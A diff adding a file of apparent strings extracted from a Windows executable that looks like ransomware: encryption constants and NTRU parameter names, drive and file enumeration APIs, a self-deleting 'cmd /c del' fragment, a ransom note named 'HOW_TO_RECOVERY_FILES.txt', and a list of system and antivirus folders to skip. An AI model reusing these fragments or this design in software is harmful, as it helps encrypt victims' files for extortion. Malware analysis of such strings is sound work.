@@ -1,0 +1,165 @@
+!This program cannot be run in DOS mode.
+vUu5vY
+vRich\
+.rdata
+(h~e|#n
+.%=P+fY
+aN97 }0
+-Pp,}2
+advapi32.dll
+SystemFunction036
+A_SHAInit
+A_SHAUpdate
+A_SHAFinal
+CryptReleaseContext
+CryptAcquireContextW
+EES401EP2
+EES587EP1
+expand 32-byte kexpand 16-byte k\
+0123456789ABCDEF
+.idata$5
+.cfguard
+.rdata
+.rdata$sxdata
+.rdata$zzzdbg
+.text$mn
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+VC20XC00U
+;t$(v(
+UQPXY]Y[
+f;G ssf
+sOAf;M
+[f;7sSf
+Ff;7s"
+tNWj@_+
+v'j@X+
+tNWj@_+
+v'j@X+
+SVWjpj
+WVh !@
+twShD!@
+|$(jhY
+\$0j$Y
+te k_^
+TSVWj@3
+LoadLibraryA
+GetProcAddress
+HeapFree
+HeapReAlloc
+HeapAlloc
+GetProcessHeap
+GetLastError
+ReadFile
+QueryDosDeviceW
+GetLogicalDrives
+FindFirstVolumeW
+SetPriorityClass
+EnterCriticalSection
+GetCurrentProcess
+lstrlenW
+WriteFile
+GetShortPathNameW
+WakeAllConditionVariable
+GetModuleFileNameW
+WaitForMultipleObjects
+SetThreadPriority
+LeaveCriticalSection
+InitializeCriticalSection
+InitializeConditionVariable
+SetFilePointer
+GetEnvironmentVariableW
+GetTempPathW
+lstrlenA
+CreateFileW
+GetCurrentThread
+lstrcatW
+CloseHandle
+CreateThread
+SetVolumeMountPointW
+GetWindowsDirectoryW
+DeleteCriticalSection
+ExitProcess
+FindVolumeClose
+GetVolumePathNamesForVolumeNameW
+FindNextVolumeW
+GetDriveTypeW
+SleepConditionVariableCS
+FindFirstFileW
+FindNextFileW
+WakeConditionVariable
+FindClose
+ExitThread
+SetFileAttributesW
+lstrcpyW
+InterlockedIncrement
+GetFileSizeEx
+SetEndOfFile
+SetFilePointerEx
+MoveFileExW
+KERNEL32.dll
+SHChangeNotify
+ShellExecuteExW
+SHELL32.dll
+memmove
+_wcsicmp
+ntdll.dll
+_chkstk
+memcpy
+memset
+RtlUnwind
+NtQueryVirtualMemory
+.ponce_New
+public
+ALLUSERSPROFILE
+TotalFiles.txt
+COMSPEC
+ /c del 
+ > nul
+$RECYCLE.BIN
+.vscode
+COMODO
+Chrome
+Common Files
+Common7
+Dr.Web
+Firefox
+HOW_TO_RECOVERY_FILES.txt
+Internet Explorer
+Kaspersky Lab
+McAfee
+Microsoft
+Microsoft Help
+Microsoft SDKs
+Microsoft Shared
+Microsoft VS Code
+Microsoft Visual Studio
+Microsoft.NET
+Movie Maker
+Mozilla Firefox
+NVIDIA Corporation
+Outlook Express
+ProgramData
+Spytech software
+Symantec
+Symantec_Client_Security
+System Volume Information
+Windows
+Windows App Certification Kit
+Windows Defender
+Windows Kits
+Windows Mail
+Windows Media Player
+Windows Multimedia Platform
+Windows NT
+Windows Phone Kits
+Windows Phone Silverlight Kits
+Windows Photo Viewer
+Windows Portable Devices
+Windows Sidebar
+WindowsPowerShell
+YandexBrowser
+sysconfig
